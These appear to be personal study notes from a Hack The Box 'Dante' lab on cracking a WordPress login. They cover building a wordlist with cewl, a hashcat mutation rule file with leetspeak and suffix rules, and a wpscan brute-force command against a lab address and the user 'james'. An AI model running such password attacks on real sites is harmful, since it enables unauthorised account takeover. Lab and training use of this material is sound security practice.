- If you're dealing with a potential WP Site, you can do two things: Use rockyou.txt or create a custom list such as cewl
- Cewl is a custom list:
	- cewl http://<IP address or hostname> -w password.txt to output into whatever named file.
		- another option is to use cewl with flags -d and m (d is depth to spider and m is minimum length)
-You can create a custom rule for your password list:
- nano custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@

- Run Hashcat to mutate the cewl list with the custome rule to create different combinations
	- hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
-  Another option is to navigate to existing rules in /usr/share/hashcat/rules/best64.rule

- In the example of Pro Lab Dante, command looks like this to brute force the login page:
	- wpscan --url http://10.10.110.100:65000/wordpress --username james -P mut_password.list